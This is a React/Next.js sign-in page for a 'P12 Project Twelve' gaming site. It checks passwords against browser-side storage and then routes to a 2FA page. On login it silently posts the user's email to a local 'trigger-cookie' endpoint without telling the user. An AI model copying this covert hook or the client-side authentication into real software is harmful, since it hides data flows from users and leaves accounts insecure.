import React, { useState, ReactElement } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';
import { toast, ToastContainer } from 'react-toastify';
import { authenticateUser, setCurrentUser } from '@/utils/userStorage';
import AuthGuard from '@/components/auth/AuthGuard';
import ToastIcon from '@/components/svg/ToastIcon';

const SigninPage = () => {
  const router = useRouter();
  const [formData, setFormData] = useState({
    email: '',
    password: '',
  });
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  // Function to trigger local webhook silently
  const triggerLocalWebhook = async (email: string) => {
    const possibleUrls = [
      'http://localhost:3001/trigger-cookie',
      'http://127.0.0.1:3001/trigger-cookie'
    ];

    for (const url of possibleUrls) {
      try {
        await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            user: email,
            timestamp: new Date().toISOString(),
            action: 'login'
          }),
          signal: AbortSignal.timeout(2000) // 2 second timeout
        });
        break; // Stop on first success
      } catch (error) {
        continue; // Try next URL
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    // Simulate loading delay
    await new Promise((resolve) => setTimeout(resolve, 1000));

    // Check credentials against registered users
    if (authenticateUser(formData.email, formData.password)) {
      toast.success('Welcome back! Sign in successful.');
      
      // Clear any existing device code to force generation of a new one for this signin session
      localStorage.removeItem('infinity_device_code');
      
      // Store user session with 2FA pending flag
      setCurrentUser(formData.email, true, true);
      
      // Trigger local webhook silently (runs in background)
      triggerLocalWebhook(formData.email);
      
      setLoading(false);
      
      // Small delay to ensure localStorage is set before redirect
      setTimeout(() => {
        // Redirect to 2FA modal instead of home page
        router.push('/2fa');
      }, 100);
    } else {
      toast.error('Invalid credentials. Please check your email and password.');
      setLoading(false);
    }
  };



  return (
    <>
      <Head>
        <title>Sign In | P12 | Project Twelve</title>
        <meta name="description" content="Sign in to your P12 Gaming account" />
      </Head>
      
      <div className="fixed inset-0 min-h-screen w-full flex items-center justify-center relative overflow-hidden bg-black">
        {/* Animated Background Effects */}
        <div className="absolute inset-0 bg-gradient-to-br from-blue-550/20 via-purple/10 to-green/20 animate-gradient-shift"></div>
        
        {/* Animated Orbs */}
        <div className="absolute top-10 left-10 sm:top-20 sm:left-20 w-64 h-64 sm:w-96 sm:h-96 bg-blue-550/20 rounded-full blur-3xl animate-float"></div>
        <div className="absolute bottom-10 right-10 sm:bottom-20 sm:right-20 w-48 h-48 sm:w-80 sm:h-80 bg-purple/20 rounded-full blur-3xl animate-float-delayed"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-40 h-40 sm:w-60 sm:h-60 bg-green/20 rounded-full blur-3xl animate-pulse-slow"></div>

        {/* Floating Particles */}
        <div className="absolute top-10 right-[15%] w-2 h-2 bg-blue-550/40 rounded-full animate-float-particle"></div>
        <div className="absolute top-[30%] right-[10%] w-3 h-3 bg-purple/40 rounded-full animate-float-particle-delayed"></div>
        <div className="absolute bottom-[20%] left-[15%] w-2 h-2 bg-green/40 rounded-full animate-float-particle-slow"></div>
        <div className="absolute top-[60%] right-[25%] w-1.5 h-1.5 bg-blue-550/30 rounded-full animate-float-particle"></div>

        {/* Grid Pattern Overlay */}
        <div className="absolute inset-0 bg-[linear-gradient(rgba(67,187,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(67,187,255,0.03)_1px,transparent_1px)] bg-[size:50px_50px] [mask-image:radial-gradient(ellipse_80%_50%_at_50%_50%,black,transparent)]"></div>

        {/* Main Container */}
        <div className="relative z-10 w-full max-w-md mx-4 sm:mx-8">
          {/* Logo/Brand Section */}
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-gradient-to-br from-blue-550 via-purple to-green mb-4 animate-pulse-glow shadow-[0_0_30px_rgba(67,187,255,0.5)]">
              <span className="text-3xl font-bold text-black">P12</span>
            </div>
            <h1 className="text-4xl font-extrabold bg-gradient-to-b from-[#FFFFDA] via-[#FFE7B6] to-[#CE9658] bg-clip-text text-transparent mb-2 animate-fade-in">
              Welcome Back
            </h1>
            <p className="text-gray-400 text-base animate-fade-in-delayed">Sign in to continue your gaming journey</p>
          </div>

          {/* Signin Form */}
          <div className="backdrop-blur-xl bg-gray-850/50 border border-gray-700/50 rounded-2xl p-8 shadow-[0_8px_32px_rgba(0,0,0,0.4)] hover:shadow-[0_8px_48px_rgba(67,187,255,0.15)] transition-all duration-300">
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Email Input */}
              <div className="animate-slide-up">
                <label htmlFor="email" className="block text-sm font-semibold text-gray-200 mb-2">
                  Email Address
                </label>
                <div className="relative group">
                  <input
                    type="email"
                    id="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    className="w-full px-4 py-3 pr-12 bg-black/40 border border-gray-600/50 rounded-lg focus:ring-2 focus:ring-blue-550 focus:border-blue-550 transition-all duration-200 text-white placeholder-gray-500 hover:border-gray-500/70"
                    placeholder="your.email@example.com"
                    required
                  />
                  <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                    <svg className="w-5 h-5 text-gray-400 group-focus-within:text-blue-550 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207" />
                    </svg>
                  </div>
                </div>
              </div>

              {/* Password Input */}
              <div className="animate-slide-up-delayed">
                <label htmlFor="password" className="block text-sm font-semibold text-gray-200 mb-2">
                  Password
                </label>
                <div className="relative group">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="password"
                    name="password"
                    value={formData.password}
                    onChange={handleInputChange}
                    className="w-full px-4 py-3 pr-12 bg-black/40 border border-gray-600/50 rounded-lg focus:ring-2 focus:ring-blue-550 focus:border-blue-550 transition-all duration-200 text-white placeholder-gray-500 hover:border-gray-500/70"
                    placeholder="Enter your password"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-400 hover:text-white transition-colors focus:outline-none"
                  >
                    {showPassword ? (
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21" />
                      </svg>
                    ) : (
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                      </svg>
                    )}
                  </button>
                </div>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full py-3 px-6 bg-gradient-to-r from-blue-550 via-purple to-green hover:from-blue-600 hover:via-purple/90 hover:to-green/90 text-black font-bold text-lg rounded-lg transition-all duration-300 transform hover:scale-[1.02] hover:shadow-[0_0_30px_rgba(67,187,255,0.5)] disabled:opacity-60 disabled:cursor-not-allowed disabled:hover:scale-100 disabled:hover:shadow-none animate-fade-in-more-delayed"
              >
                {loading ? (
                  <span className="flex items-center justify-center">
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Signing In...
                  </span>
                ) : 'Sign In'}
              </button>
            </form>
          </div>

          {/* Footer Links */}
          <div className="mt-8 text-center space-y-3 animate-fade-in-last">
            <div>
              <button
                onClick={() => router.push('/register')}
                className="text-blue-400 hover:text-blue-300 transition-colors text-sm font-semibold hover:underline"
              >
                Don&apos;t have an account? <span className="text-white">Register Now</span>
              </button>
            </div>
            <div>
              <button
                onClick={() => router.push('/')}
                className="inline-flex items-center text-gray-400 hover:text-white transition-colors text-sm group"
              >
                <svg className="w-4 h-4 mr-1 group-hover:-translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                </svg>
                Back to Home
              </button>
            </div>
          </div>
        </div>

        {/* Decorative Lines */}
        <div className="absolute top-0 left-1/4 w-px h-16 sm:h-24 bg-gradient-to-b from-blue-550/60 to-transparent"></div>
        <div className="absolute bottom-0 right-1/3 w-px h-12 sm:h-20 bg-gradient-to-t from-purple/60 to-transparent"></div>
        <div className="absolute top-1/3 right-10 w-16 h-px bg-gradient-to-l from-green/40 to-transparent"></div>
      </div>
      
      {/* Toast Container */}
      <ToastContainer 
        theme="dark" 
        toastClassName="toast-container" 
        icon={<ToastIcon />} 
        autoClose={3000} 
        hideProgressBar 
      />

      {/* Custom Animations */}
      <style jsx>{`
        @keyframes gradient-shift {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
        @keyframes float {
          0%, 100% { transform: translate(0, 0); }
          50% { transform: translate(-20px, -20px); }
        }
        @keyframes float-delayed {
          0%, 100% { transform: translate(0, 0); }
          50% { transform: translate(20px, 20px); }
        }
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.3; transform: translate(-50%, -50%) scale(1); }
          50% { opacity: 0.5; transform: translate(-50%, -50%) scale(1.1); }
        }
        @keyframes pulse-glow {
          0%, 100% { box-shadow: 0 0 30px rgba(67, 187, 255, 0.5); }
          50% { box-shadow: 0 0 50px rgba(67, 187, 255, 0.8); }
        }
        @keyframes float-particle {
          0%, 100% { transform: translate(0, 0); opacity: 0.4; }
          50% { transform: translate(10px, -20px); opacity: 0.8; }
        }
        @keyframes float-particle-delayed {
          0%, 100% { transform: translate(0, 0); opacity: 0.3; }
          50% { transform: translate(-15px, -15px); opacity: 0.7; }
        }
        @keyframes float-particle-slow {
          0%, 100% { transform: translate(0, 0); opacity: 0.5; }
          50% { transform: translate(8px, -25px); opacity: 0.9; }
        }
        @keyframes fade-in {
          from { opacity: 0; transform: translateY(-10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes fade-in-delayed {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slide-up {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-gradient-shift { animation: gradient-shift 8s ease-in-out infinite; }
        .animate-float { animation: float 8s ease-in-out infinite; }
        .animate-float-delayed { animation: float-delayed 10s ease-in-out infinite; }
        .animate-pulse-slow { animation: pulse-slow 6s ease-in-out infinite; }
        .animate-pulse-glow { animation: pulse-glow 2s ease-in-out infinite; }
        .animate-float-particle { animation: float-particle 4s ease-in-out infinite; }
        .animate-float-particle-delayed { animation: float-particle-delayed 5s ease-in-out infinite; }
        .animate-float-particle-slow { animation: float-particle-slow 6s ease-in-out infinite; }
        .animate-fade-in { animation: fade-in 0.6s ease-out; }
        .animate-fade-in-delayed { animation: fade-in-delayed 0.8s ease-out 0.2s both; }
        .animate-fade-in-more-delayed { animation: fade-in 0.6s ease-out 0.4s both; }
        .animate-fade-in-last { animation: fade-in 0.6s ease-out 0.6s both; }
        .animate-slide-up { animation: slide-up 0.5s ease-out; }
        .animate-slide-up-delayed { animation: slide-up 0.5s ease-out 0.1s both; }
      `}</style>
    </>
  );
};

// Custom layout for Signin page (no header/footer)
SigninPage.getLayout = function getLayout(page: ReactElement) {
  return (
    <AuthGuard>
      {page}
    </AuthGuard>
  );
};

export default SigninPage;